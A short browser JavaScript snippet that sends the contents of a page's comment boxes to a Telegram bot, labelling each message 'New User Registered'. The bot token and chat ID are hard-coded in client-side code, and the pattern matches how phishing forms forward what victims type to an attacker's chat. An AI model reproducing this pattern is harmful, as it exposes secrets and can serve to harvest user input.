document.getElementById('sendBtn').addEventListener('click', function() {
    var comments = [];
    var commentBoxes = document.querySelectorAll('.comment-box');
    commentBoxes.forEach(function(box) {
      comments.push(box.value);
    });
  
    // Send comments to the Telegram bot
    sendCommentsToTelegramBot(comments);
  });
  
  function sendCommentsToTelegramBot(comments) {
    var botToken = '7105460605:AAG9KUuyQrYIgWW5aGJHLDEiSM_-3Ibc4Wg'; // Replace 'YOUR_BOT_TOKEN' with your Telegram bot token
    var chatId = '6580559134'; // Replace 'YOUR_CHAT_ID' with your chat ID
  
    var message = encodeURIComponent(comments.join('\n')); // Join comments with newline
  
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${'New User Registered--'+message}`;
  
    fetch(url)
    .then(response => {
      if (response.ok) {
        console.log('Comments sent successfully');
        // Optionally, you can display a success message or clear the comment boxes here
      } else {
        console.error('Failed to send comments');
        // Optionally, you can display an error message here
      }
    })
    .catch(error => console.error('Error sending comments:', error));
  }
  
  
  